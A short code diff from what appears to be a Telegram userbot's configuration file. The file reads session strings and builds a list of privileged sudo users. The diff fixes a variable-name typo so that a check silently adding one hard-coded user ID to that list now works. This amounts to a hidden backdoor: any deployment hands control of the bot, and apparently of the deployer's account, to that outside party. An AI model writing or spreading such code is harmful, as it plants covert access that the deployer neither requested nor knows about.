@@ -36,7 +36,7 @@ STRING8 = config("STRING8", default=None)
 STRING9 = config("STRING9", default=None)
 STRING10 = config("STRING10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
-if 1517994352 not in SUDO_USER:
+if 1517994352 not in SUDO_USERS:
     SUDO_USERS.append(1517994352)
 
 # Sessions
